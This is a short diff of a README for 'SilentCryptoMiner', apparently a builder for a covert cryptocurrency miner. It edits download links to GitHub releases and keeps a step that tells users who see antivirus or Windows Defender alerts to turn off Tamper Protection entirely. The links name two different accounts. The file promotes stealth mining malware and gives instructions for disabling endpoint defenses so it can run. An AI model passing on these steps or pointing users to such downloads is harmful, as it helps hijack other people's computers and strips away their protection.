@@ -24,7 +24,7 @@ If the builder is flagged by antivirus or Windows Defender:
 
 1. Disable **Tamper Protection**:  
 2. Go To → Windows Search → Tamper Protection → Turn Off Everything.
-3. Re-download the project from [GitHub Releases](https://github.com/2POLO/SilentCryptoMiner/releases/tag/V1).
+3. Re-download the project
 4. (Recommended) Use a **fresh VM** or isolated testing environment.
 
 ---
@@ -81,4 +81,4 @@ If the builder is flagged by antivirus or Windows Defender:
 ## 📥 Download & Installation
 
 🔗 **Download Latest Release (v1)**:  
-[https://github.com/5POLO/SilentCryptoMiner/releases/tag/v1)
+- https://github.com/5POLO/SilentCryptoMiner/releases/tag/v1
